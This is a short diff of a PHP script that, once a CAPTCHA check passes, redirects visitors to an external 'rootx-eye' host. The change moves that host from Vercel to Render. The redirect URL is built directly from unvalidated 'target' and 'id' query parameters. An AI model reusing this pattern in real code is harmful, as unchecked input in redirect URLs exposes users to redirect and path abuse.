@@ -12,7 +12,7 @@ if (!isset($_SESSION['captcha'])) $_SESSION['captcha'] = generateCaptcha();
 if (isset($_POST['captcha'])) {
     if (strtoupper($_POST['captcha']) == $_SESSION['captcha']) {
         $target = $_GET['target'] ?? 'cf';
-        header("Location: https://rootx-eye.vercel.app/{$target}_bot.php?id=" . ($_GET['id'] ?? ''));
+        header("Location: https://rootx-eye-1.onrender.com/{$target}_bot.php?id=" . ($_GET['id'] ?? ''));
         exit;
     } else {
         $error = "❌ Invalid CAPTCHA!";
